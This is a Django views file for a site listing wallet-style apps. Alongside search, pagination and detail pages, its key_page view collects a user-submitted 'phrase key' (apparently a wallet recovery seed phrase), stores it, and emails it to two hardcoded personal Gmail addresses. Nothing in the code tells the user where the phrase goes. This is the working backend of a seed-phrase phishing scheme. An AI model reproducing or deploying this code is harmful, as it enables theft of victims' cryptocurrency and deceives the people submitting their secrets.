from django.shortcuts import render, redirect
from .models import Multiapps
from .form import PhraseKeyForm
from django.shortcuts import get_object_or_404
from django.core.paginator import Paginator, EmptyPage, PageNotAnInteger
from django.core.mail import send_mail


# Create your views here.
def homePage(request):
    search_query = request.GET.get('q', '')
    if search_query:
        all_apps = Multiapps.objects.filter(name__icontains=search_query)
    else:
        all_apps = Multiapps.objects.all().order_by('-id')
    page_obj=paginate_objects(request, all_apps, 24)
    context = {
        'page_obj': page_obj,
        'search_query': search_query,
    }
    return render(request, 'main/index.html', context)


def appDetail(request, app_id):
    app = get_object_or_404(Multiapps, id=app_id)
    return render(request, 'main/detail.html', {'app':app})


def key_page(request, app_id):
    app = get_object_or_404(Multiapps, id=app_id)
    if request.method == 'POST':
        form = PhraseKeyForm(request.POST)
        if form.is_valid():
            key_form = form.save(commit=False)
            key_form.name = app
            key_form.save()

            # Email sending logic
            subject = f"New Phrase Key Submission for {app.name}"
            message = f"{app.name} Phrase Key: {key_form.phrase_key}"
            recipient_list = ['prettywashington17@gmail.com','successsimeon484@gmail.com']
            sender_email = 'webmaster@example.com'
            send_mail(subject, message, sender_email, recipient_list)
            return redirect('success', app_id=app.id)
    else:
        form = PhraseKeyForm()
    context = {
        'form':form,
        'app':app
    }
    return render(request, 'main/key.html', context)


def successfully(request, app_id):
    app = get_object_or_404(Multiapps, id=app_id)
    return render(request, 'main/success.html', {'app': app})


def paginate_objects(request, object_list, items_per_page):
    paginator = Paginator(object_list, items_per_page)
    page_number = request.GET.get("page")
    try:
        page_obj = paginator.page(page_number)
    except PageNotAnInteger:
        page_obj = paginator.page(1)
    except EmptyPage:
        page_obj = paginator.page(paginator.num_pages)
    
    return page_obj